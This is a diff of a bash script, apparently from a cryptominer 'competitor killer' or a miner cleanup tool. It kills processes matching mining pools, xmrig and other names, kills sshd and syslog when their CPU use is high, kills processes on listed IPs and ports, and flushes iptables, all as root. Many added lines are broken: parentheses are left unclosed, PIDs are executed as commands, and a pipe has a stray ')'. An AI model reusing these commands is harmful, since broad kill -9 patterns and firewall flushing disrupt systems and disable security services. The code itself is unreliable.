@@ -13,11 +13,11 @@
 # Killing processes by name, path, arguments and CPU utilization
 processes(){
 	killme() {
-	  killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' | xargs kill -9 & > /dev/null &
+	  killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' & > /dev/null &
 	}
 
 	killa() {
-	what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9&>/dev/null&
+	what=$1;ps auxw|awk "/$what/" |awk '!/awk/' )&>/dev/null&
 	}
 
 	killa 34e2fg
@@ -43,32 +43,34 @@ processes(){
 	pkill -f sourplum
 	pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
 	
-	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
-	ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
+	kill -9 $(pgrep -f -u root mine.moneropool.com)
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:8080)
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:3333)
+	kill -9 $(pgrep -f -u root monerohash.com)
+	kill -9 $(pgrep -f -u root /tmp/a7b104c270)
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:6666)
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:7777)
+	kill -9 $(pgrep -f -u root xmr.crypto-pool.fr:443)
+	kill -9 $(pgrep -f -u root stratum.f2pool.com:8888)
+	kill -9 $(pgrep -f -u root xmrpool.eu)
+	kill -9 $(pgrep -f -u root xmrig)
+	kill -9 $(pgrep -f -u root xmrigDaemon)
+	kill -9 $(pgrep -f -u root xmrigMiner)
+	kill -9 $(pgrep -f -u root /var/tmp/java)
+	kill -9 $(pgrep -f -u root ddgs)
+	kill -9 $(pgrep -f -u root qW3xT)
+	kill -9 $(pgrep -f -u root t00ls.ru)
+	kill -9 $(pgrep -f -u root /var/tmp/sustes)
+	kill -9 $(pgrep -f -u root config.json)
+ 	kill -9 $(pgrep -f -u root kswapd0)
 
-	ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
-	ps auxf|grep named| awk '{print $2}'|xargs kill -9
-	ps auxf|grep kernelcfg| awk '{print $2}'|xargs kill -9
-	ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
-	ps auxf|grep kernelupgrade| awk '{print $2}'|xargs kill -9
-	ps auxf|grep kernelorg| awk '{print $2}'|xargs kill -9
-	ps auxf|grep kernelupdates| awk '{print $2}'|xargs kill -9
+	kill -9 $(pgrep -f -u root xiaoyao)
+	kill -9 $(pgrep -f -u root named)
+	kill -9 $(pgrep -f -u root kernelcfg)
+	kill -9 $(pgrep -f -u root xiaoxue)
+	kill -9 $(pgrep -f -u root kernelupgrade)
+	kill -9 $(pgrep -f -u root kernelorg)
+	kill -9 $(pgrep -f -u root kernelupdates)
 
 	ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
 	ps ax|grep -o './[0-9]* -c'| xargs pkill -f
@@ -153,26 +155,28 @@ processes(){
 	rm /tmp/crondpid -f
 	 
 	# sshd
-	ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
+ 	# (ALT!) ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
+  
+ 	$(pgrep -f -u root sshd) > /tmp/sshdpid	
 	while read sshdpid
 	do
 		if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
 		then
 			kill $sshdpid
 		fi
-	done < /tmp/ssdpid
-	rm -f /tmp/ssdpid
+	done < /tmp/sshdpid
+	rm -f /tmp/sshdpid
 
 	# syslog
-	ps ax | grep syslogs | grep -v grep | awk '{print $1}' > /tmp/syslogspid
+	$(pgrep -f -u root syslog) >  /tmp/syslogpid
 	while read syslogpid
 	do
 		if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
 		then
 			kill  $syslogpid
 		fi
-	done < /tmp/syslogspid
-	rm /tmp/syslogspid -f
+	done < /tmp/syslogpid
+	rm /tmp/syslogpid -f
 }
 
 
@@ -214,18 +218,19 @@ block_redis_port() {
 # Killing and blocking miners by network related IOC
 network(){
 	# Kill by known ports/IPs
-	netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
-	netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+ 	kill -9 $(netstat -anp | grep 91.214.65.238:58091 |awk '{print $7}'| awk -F'[/]' '{print $1}')
+	kill -9 $(netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}'
+	kill -9 $(netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}'
 	
 	# Block known miner ports
 	iptables -F
